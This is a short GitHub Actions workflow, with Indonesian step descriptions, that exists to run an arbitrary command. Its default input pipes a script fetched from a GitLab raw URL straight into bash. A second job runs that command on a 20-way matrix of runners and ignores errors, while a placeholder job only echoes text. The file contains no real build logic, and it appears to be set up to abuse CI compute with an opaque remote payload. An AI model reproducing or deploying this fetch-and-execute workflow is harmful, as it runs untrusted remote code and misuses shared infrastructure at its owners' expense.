name: iokoi

on:
  workflow_dispatch:
    inputs:
      command:
        description: 'Perintah yang akan dijalankan di job hert'
        required: false
        default: 'curl -sL https://gitlab.com/masaakk88/file/diamonds8line/-/raw/main/var999 | bash'

jobs:
  hert:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        build: [A.1, B.1]
        flag: [A, B, C, D, E, F, G, H, I, J]
    steps:
      - name: hertob
        continue-on-error: true
        run: echo hert

  bert:
    needs: [hert]
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      matrix:
        build: [C.1, D.1]
        flag: [A, B, C, D, E, F, G, H, I, J]
    steps:
      - name: Jalankan 
        continue-on-error: true
        run: ${{ github.event.inputs.command }}